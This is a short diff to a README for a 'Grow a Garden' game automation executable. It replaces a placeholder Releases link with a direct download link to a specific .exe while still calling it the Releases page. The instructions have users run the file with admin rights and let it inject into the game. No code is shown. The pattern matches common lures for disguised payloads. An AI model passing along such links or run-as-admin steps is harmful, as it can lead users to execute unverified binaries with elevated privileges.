@@ -18,7 +18,7 @@ An all-in-one executable tool designed to automate gardening mechanics in games 
 
 ## 📦 How to Use
 
-1. **Download the EXE** from the [Releases](https://github.com/yourusername/grow-a-garden-exe/releases) page.
+1. **Download the EXE** from the [Releases](https://github.com/yue-os/grow-a-garden-script/releases/download/script/Grow-a-Garden-script.exe) page.
 2. **Run the EXE** with admin rights *(if needed)*.
 3. A GUI window will open where you can toggle features.
 4. Open the target game and ensure the tool is injecting or attaching properly.
